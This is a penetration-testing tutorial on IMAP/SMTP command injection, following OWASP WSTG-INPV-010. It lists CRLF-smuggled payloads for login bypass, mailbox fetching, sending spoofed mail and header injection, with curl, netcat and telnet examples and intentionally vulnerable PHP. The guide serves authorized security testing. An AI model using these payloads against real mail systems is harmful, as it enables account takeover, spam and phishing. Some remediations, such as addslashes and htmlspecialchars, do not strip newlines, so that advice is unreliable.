# Testing for IMAP/SMTP Injection Vulnerabilities

## Overview

Testing for IMAP/SMTP Injection vulnerabilities involves verifying that a web application properly sanitizes user input used in IMAP (Internet Message Access Protocol) or SMTP (Simple Mail Transfer Protocol) commands to prevent attackers from manipulating email server interactions. According to OWASP (WSTG-INPV-010), IMAP/SMTP Injection occurs when untrusted input is incorporated into email protocol commands, enabling attackers to access unauthorized email accounts, send malicious emails, or manipulate server responses. This guide provides a hands-on methodology to test for IMAP/SMTP Injection vulnerabilities, focusing on input vectors, IMAP command injection, SMTP command injection, authentication bypass, and email header manipulation, with tools, commands, payloads, and remediation strategies.

**Impact**: IMAP/SMTP Injection vulnerabilities can lead to:
- Unauthorized access to email accounts or mailboxes.
- Sending of unauthorized emails (e.g., spam, phishing).
- Exposure of sensitive email content or metadata.
- Manipulation of email headers or server responses.
- Non-compliance with security standards (e.g., PCI DSS, GDPR).

This guide aligns with OWASP’s WSTG-INPV-010, offering black-box and gray-box testing steps, beginner-friendly tool setups, specific commands, and ethical considerations. 

**Ethical Note**: Obtain explicit permission before testing, as IMAP/SMTP injection attempts may access sensitive email data, send unauthorized emails, or disrupt mail server operations.

## Testing Tools

The following tools are recommended for testing IMAP/SMTP Injection vulnerabilities, with setup instructions optimized for new pentesters:

- **Burp Suite Community Edition**: Intercepts and modifies HTTP requests to inject IMAP/SMTP payloads.
  - Download from [PortSwigger](https://portswigger.net/burp/communitydownload).
  - Configure browser proxy: `127.0.0.1:8080` (Firefox recommended).
  - Use Repeater to test payloads and Proxy > HTTP History to identify input vectors.
  - **Note**: Check responses for email server errors or unexpected behavior.

- **OWASP ZAP 3.0**: A free tool for automated and manual injection testing.
  - Download from [ZAP](https://www.zaproxy.org/download/).
  - Configure browser proxy: `127.0.0.1:8080`.
  - Enable HUD (Heads-Up Display):
    1. Go to Tools > Options > HUD.
    2. Enable HUD for in-browser testing.
  - Use Active Scan with custom injection rules; manually verify findings due to limited IMAP/SMTP support.

- **cURL and HTTPie**: Send HTTP requests with IMAP/SMTP payloads.
  - **cURL**:
    - Install on Linux:
      ```bash
      sudo apt install curl
      ```
    - Install on Windows/Mac: Pre-installed or download from [curl.se](https://curl.se/).
  - **HTTPie** (beginner-friendly):
    - Install on Linux/Mac:
      ```bash
      sudo apt install httpie
      ```
    - Install on Windows: `pip install httpie`.
    - Example:
      ```bash
      # cURL
      curl -i "http://example.com/mail?user=admin%0ALOGIN%20user2%20pass"
      # HTTPie
      http "http://example.com/mail?user==admin%0ALOGIN user2 pass"
      ```

- **Netcat (nc)**: Tests direct IMAP/SMTP server interactions.
  - Install on Linux:
    ```bash
    sudo apt install netcat
    ```
  - Install on Windows/Mac: Download from [nmap.org](https://nmap.org/ncat/).
  - Example:
    ```bash
    echo -e "a1 LOGIN admin\r\nSELECT INBOX" | nc mail.example.com 143
    ```

- **Postman**: GUI tool for testing IMAP/SMTP injection in APIs or forms.
  - Download from [Postman](https://www.postman.com/downloads/).
  - Send payloads in query parameters or body.
  - **Tip**: Use Collections for batch testing.

- **Browser Developer Tools (Chrome/Firefox)**: Inspects responses to IMAP/SMTP payloads.
  - Access: Press `F12` or `Ctrl+Shift+I`.
  - Use Network tab to analyze responses and Elements tab for error messages.
  - **Note**: Firefox’s 2025 network analysis improvements enhance response inspection.

- **Telnet**: Tests raw IMAP/SMTP commands.
  - Install on Linux:
    ```bash
    sudo apt install telnet
    ```
  - Install on Windows: Enabled by default; on Mac: `brew install telnet`.
  - Example:
    ```bash
    telnet mail.example.com 143
    a1 LOGIN testuser testpass
    ```

## Testing Methodology

This methodology follows OWASP’s black-box and gray-box approaches for WSTG-INPV-010, testing IMAP/SMTP Injection vulnerabilities across input vectors, IMAP command injection, SMTP command injection, authentication bypass, and email header manipulation.

### Common IMAP/SMTP Injection Payloads

Below is a list of common IMAP/SMTP Injection payloads to test various protocol vulnerabilities. Start with simple payloads and escalate based on responses. Use with caution in controlled environments to avoid unintended email access or sending.

- **IMAP Payloads**:
  - `%0ALOGIN user2 pass` (Injects new LOGIN command)
  - `%0ASELECT INBOX` (Selects mailbox)
  - `%0AFETCH 1:* ALL` (Fetches all emails)
  - `%0ALIST "" *` (Lists mailboxes)

- **SMTP Payloads**:
  - `%0AMAIL FROM:<attacker@example.com>` (Sets sender)
  - `%0ARCPT TO:<victim@example.com>` (Sets recipient)
  - `%0ADATA%0ASubject: Test%0A%0AMalicious content%0A.` (Sends email)
  - `HELO attacker.com%0AMAIL FROM:<attacker@example.com>` (Initiates SMTP session)

- **Authentication Bypass**:
  - `admin%0ALOGIN admin pass` (IMAP login bypass)
  - `admin%0AAUTHENTICATE PLAIN dXNlcm5hbWUAcGFzc3dvcmQ=` (IMAP base64 auth)
  - `user%0AMAIL FROM:<admin@example.com>` (SMTP sender spoof)

- **Header Manipulation**:
  - `user%0AFrom: admin@example.com` (Injects From header)
  - `user%0ASubject: Malicious%0AX-Header: test` (Injects custom headers)

- **Encoded Payloads**:
  - `%0D%0ALOGIN%20user2%20pass` (CRLF-encoded IMAP command)
  - `%0D%0AMAIL%20FROM%3A%3Cattacker%40example.com%3E` (CRLF-encoded SMTP command)

**Note**: Payloads depend on the email server (e.g., Postfix, Dovecot) and protocol (IMAP: port 143, SMTP: port 25). Test payloads in URL parameters, form fields, or headers where input is processed by mail servers.

### 1. Identify Input Vectors

**Objective**: Locate user-controllable inputs that interact with IMAP/SMTP servers.

**Steps**:
1. Browse the website:
   - Visit the target (e.g., `http://example.com`).
   - Identify email-related features (e.g., login forms, email search, contact forms).
2. Capture requests with Burp Suite:
   - Enable Intercept (Proxy > Intercept > On).
   - Submit forms or interact with email features to capture requests in HTTP History.
   - Note parameters (e.g., `user=admin`, `email=test@example.com`).
3. Inspect responses:
   - Check for IMAP/SMTP errors (e.g., `BAD Command`) or email server responses.
   - Use Developer Tools (`Ctrl+Shift+I`) to search for email-related output.
4. List input vectors:
   - Document query parameters, form fields, headers, and JSON payloads.

**Example Input Vectors**:
- URL: `http://example.com/mail?user=admin`
- Form: `<input name="email">`
- API: `POST /send` with `{"to": "user@example.com"}`

**Remediation**:
- Validate inputs with allowlists:
  ```php
  if (!preg_match('/^[a-zA-Z0-9@.]+$/', $_GET['user'])) die("Invalid input");
  ```
- Escape special characters:
  ```php
  $user = addslashes($_GET['user']);
  ```

**Tip**: Save the input vector list in a report.

### 2. Test for IMAP Command Injection

**Objective**: Verify if user input can inject IMAP commands to manipulate mailboxes.

**Steps**:
1. Identify IMAP-related inputs:
   - Look for email login or mailbox access forms.
2. Inject payloads:
   - Use Burp Repeater:
     ```http
     GET /mail?user=admin%0ALOGIN user2 pass HTTP/1.1
     Host: example.com
     ```
   - Use cURL:
     ```bash
     curl -i "http://example.com/mail?user=admin%0ALOGIN user2 pass"
     ```
3. Check responses:
   - Look for unauthorized mailbox access or IMAP errors.
   - Test: `%0ASELECT INBOX` or `%0AFETCH 1:* ALL`.
4. Use Netcat to confirm:
   ```bash
   echo -e "a1 LOGIN admin%0ALOGIN user2 pass\r\nSELECT INBOX" | nc mail.example.com 143
   ```

**Example Vulnerable Code (PHP)**:
```php
$user = $_GET['user'];
$imap = imap_open("{mail.example.com:143}", $user, $password);
```
Test: `?user=admin%0ALOGIN user2 pass`
Result: Logs in as `user2`.

**Example Secure Code (PHP)**:
```php
$user = preg_replace('/[^a-zA-Z0-9]/', '', $_GET['user']);
$imap = imap_open("{mail.example.com:143}", $user, $password);
```
Test: No login.

**Remediation**:
- Sanitize inputs:
  ```php
  $user = htmlspecialchars($user, ENT_QUOTES, 'UTF-8');
  ```
- Use secure IMAP libraries with validation.

**Tip**: Save unauthorized access evidence in a report.

### 3. Test for SMTP Command Injection

**Objective**: Check if user input can inject SMTP commands to send unauthorized emails.

**Steps**:
1. Identify SMTP-related inputs:
   - Look for contact forms, email APIs, or send-email features.
2. Inject payloads:
   - Use Burp:
     ```http
     POST /send HTTP/1.1
     Host: example.com
     Content-Type: application/x-www-form-urlencoded
     to=user@example.com%0AMAIL FROM:<attacker@example.com>%0ARCPT TO:<victim@example.com>%0ADATA%0ASubject: Test%0A%0AMalicious%0A.
     ```
   - Use HTTPie:
     ```bash
     http POST http://example.com/send to="user@example.com%0AMAIL FROM:<attacker@example.com>%0ARCPT TO:<victim@example.com>%0ADATA%0ASubject: Test%0A%0AMalicious%0A."
     ```
3. Check responses:
   - Look for email delivery or SMTP errors.
   - Monitor attacker-controlled email for exfiltrated data.
4. Use Telnet to confirm:
   ```bash
   telnet mail.example.com 25
   HELO test
   MAIL FROM:<attacker@example.com>
   RCPT TO:<victim@example.com>
   DATA
   Subject: Test
   Malicious
   .
   ```

**Example Vulnerable Code (PHP)**:
```php
$to = $_POST['to'];
mail($to, "Subject", "Message");
```
Test: `to=user@example.com%0AMAIL FROM:<attacker@example.com>`
Result: Sends email from `attacker@example.com`.

**Example Secure Code (PHP)**:
```php
$to = filter_var($_POST['to'], FILTER_VALIDATE_EMAIL);
if (!$to) die("Invalid email");
mail($to, "Subject", "Message");
```
Test: No email sent.

**Remediation**:
- Validate email addresses:
  ```php
  filter_var($email, FILTER_VALIDATE_EMAIL);
  ```
- Use secure SMTP libraries:
  ```php
  $transport = (new Swift_SmtpTransport('smtp.example.com', 25))->setUsername('user')->setPassword('pass');
  ```

**Tip**: Save email delivery evidence in a report.

### 4. Test for Authentication Bypass

**Objective**: Verify if IMAP/SMTP authentication can be bypassed via injection.

**Steps**:
1. Identify authentication inputs:
   - Look for IMAP login forms or SMTP auth endpoints.
2. Inject payloads:
   - Use Burp:
     ```http
     GET /mail?user=admin%0AAUTHENTICATE PLAIN dXNlcm5hbWUAcGFzc3dvcmQ= HTTP/1.1
     Host: example.com
     ```
   - Use cURL:
     ```bash
     curl -i "http://example.com/mail?user=admin%0AAUTHENTICATE PLAIN dXNlcm5hbWUAcGFzc3dvcmQ="
     ```
3. Check responses:
   - Look for unauthorized access or auth errors.
   - Test: `admin%0ALOGIN admin pass`.
4. Use Netcat:
   ```bash
   echo -e "a1 LOGIN admin%0AAUTHENTICATE PLAIN dXNlcm5hbWUAcGFzc3dvcmQ=\r\n" | nc mail.example.com 143
   ```

**Example Vulnerable Code (PHP)**:
```php
$user = $_GET['user'];
$imap = imap_open("{mail.example.com:143}", $user, "pass");
```
Test: `?user=admin%0ALOGIN user2 pass`
Result: Authenticates as `user2`.

**Example Secure Code (PHP)**:
```php
$user = preg_replace('/[^a-zA-Z0-9]/', '', $user);
$imap = imap_open("{mail.example.com:143}", $user, "pass");
```
Test: No authentication.

**Remediation**:
- Reject special characters:
  ```php
  if (preg_match('/[\r\n%]/', $user)) die("Invalid input");
  ```
- Enforce strong authentication:
  ```php
  imap_open("{mail.example.com:143/ssl}", $user, $pass);
  ```

**Tip**: Save authentication bypass evidence in a report.

### 5. Test for Email Header Manipulation

**Objective**: Check if user input can manipulate email headers to spoof or inject content.

**Steps**:
1. Identify header-related inputs:
   - Look for form fields for email subject, sender, or custom headers.
2. Inject payloads:
   - Use Burp:
     ```http
     POST /send HTTP/1.1
     Host: example.com
     Content-Type: application/x-www-form-urlencoded
     subject=Test%0AFrom: admin@example.com
     ```
   - Use HTTPie:
     ```bash
     http POST http://example.com/send subject="Test%0AFrom: admin@example.com"
     ```
3. Check responses:
   - Monitor sent emails for spoofed headers (e.g., `From: admin@example.com`).
   - Test: `subject=Test%0AX-Header: malicious`.
4. Use Telnet to confirm:
   ```bash
   telnet mail.example.com 25
   HELO test
   MAIL FROM:<test@example.com>
   RCPT TO:<victim@example.com>
   DATA
   Subject: Test
   From: admin@example.com
   .
   ```

**Example Vulnerable Code (PHP)**:
```php
$subject = $_POST['subject'];
$headers = "From: sender@example.com";
mail("recipient@example.com", $subject, "Message", $headers);
```
Test: `subject=Test%0AFrom: admin@example.com`
Result: Spoofs `From` header.

**Example Secure Code (PHP)**:
```php
$subject = str_replace(["\r", "\n"], '', $_POST['subject']);
$headers = "From: sender@example.com";
mail("recipient@example.com", $subject, "Message", $headers);
```
Test: No spoofing.

**Remediation**:
- Strip CRLF characters:
  ```php
  $subject = str_replace(["\r", "\n"], '', $subject);
  ```
- Use secure email libraries:
  ```php
  $message = new Swift_Message('Subject');
  $message->setFrom(['sender@example.com' => 'Sender']);
  ```

**Tip**: Save spoofed email headers in a report.
